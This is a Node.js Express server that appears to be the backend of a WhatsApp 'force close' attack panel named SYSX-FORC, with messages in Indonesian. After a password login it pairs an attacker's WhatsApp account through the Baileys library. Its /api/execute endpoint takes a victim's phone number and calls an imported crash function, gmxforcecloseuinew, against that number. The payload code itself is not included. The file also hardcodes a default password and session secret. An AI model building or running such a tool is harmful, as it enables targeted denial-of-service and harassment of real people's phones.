const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PASSWORD = process.env.PASSWORD || 'force$$$';

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ========== SESSION ==========
app.use(session({
  secret: process.env.SESSION_SECRET || 'sysx-forc-secret',
  resave: false,
  saveUninitialized: true,
  cookie: {
    maxAge: 3600000 * 24,
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax'
  }
}));

// ========== STATIC ROUTES ==========
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/dashboard.html', (req, res) => {
  if (!req.session.loggedIn) {
    return res.redirect('/');
  }
  res.sendFile(path.join(__dirname, '../public/dashboard.html'));
});

// ========== SERVE STATIC FILES ==========
app.use(express.static(path.join(__dirname, '../public')));

// ========== WHATSAPP SESSION ==========
let sock = null;
let isConnected = false;
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');

async function startWhatsAppSession() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
    sock = makeWASocket({
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.ubuntu('Linux'),
      auth: state,
      syncFullHistory: false,
      markOnlineOnConnect: false
    });
    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'open') { isConnected = true; console.log('🔥 WA ONLINE'); }
      if (connection === 'close') {
        isConnected = false;
        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {
          setTimeout(startWhatsAppSession, 5000);
        }
      }
    });
    sock.ev.on('creds.update', saveCreds);
  } catch (err) { console.error('WA ERROR:', err); }
}

// ========== ROUTE API ==========
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  if (password === PASSWORD) {
    req.session.loggedIn = true;
    req.session.user = 'Dale Andrews';
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false, message: 'PASSWORD SALAH!' });
  }
});

app.get('/api/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/'));
});

app.get('/api/check-session', (req, res) => {
  res.json({ loggedIn: !!req.session.loggedIn, user: req.session.user || null });
});

app.post('/api/pair', async (req, res) => {
  if (!req.session.loggedIn) return res.status(401).json({ error: 'LOGIN DULU!' });
  const { phoneNumber } = req.body;
  if (!phoneNumber || !phoneNumber.startsWith('62')) {
    return res.status(400).json({ error: 'NOMOR HARUS 62xxx!' });
  }
  try {
    if (!sock) await startWhatsAppSession();
    const code = await sock.requestPairingCode(phoneNumber);
    res.json({ success: true, pairingCode: code });
  } catch (err) {
    res.status(500).json({ error: 'GAGAL PAIRING: ' + err.message });
  }
});

app.post('/api/execute', async (req, res) => {
  if (!req.session.loggedIn) return res.status(401).json({ error: 'LOGIN DULU!' });
  const { target } = req.body;
  if (!target || !target.startsWith('62')) {
    return res.status(400).json({ error: 'TARGET HARUS 62xxx!' });
  }
  if (!sock || !isConnected) {
    return res.status(500).json({ error: 'WHATSAPP BELUM TERHUBUNG!' });
  }
  try {
    const targetJid = target + '@s.whatsapp.net';
    const { gmxforcecloseuinew } = require('../public/function.js');
    await gmxforcecloseuinew(sock, targetJid);
    res.json({ success: true, message: `🔥 FORCECLOSE DIKIRIM KE ${target}` });
  } catch (err) {
    res.status(500).json({ error: 'GAGAL EKSEKUSI: ' + err.message });
  }
});

app.get('/api/status', (req, res) => {
  res.json({
    connected: isConnected,
    sessionActive: !!sock,
    loggedIn: !!req.session.loggedIn,
    user: req.session.user || null
  });
});

// ========== START ==========
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, async () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    await startWhatsAppSession();
  });
}

module.exports = app;
